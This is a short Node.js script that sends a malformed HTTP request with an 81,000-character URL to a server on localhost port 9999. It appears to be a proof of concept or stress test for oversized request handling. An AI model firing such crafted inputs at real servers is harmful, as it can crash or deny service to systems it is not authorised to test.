const net = require('net');

const client = net.createConnection({ port: 9999 }, () => 
{
    client.write(`GET http://${Array(81000).join('0')} HTTP/1.1
    Host: localhost:9999


    "`);
    });

    //run this command first :  nf start -f 9999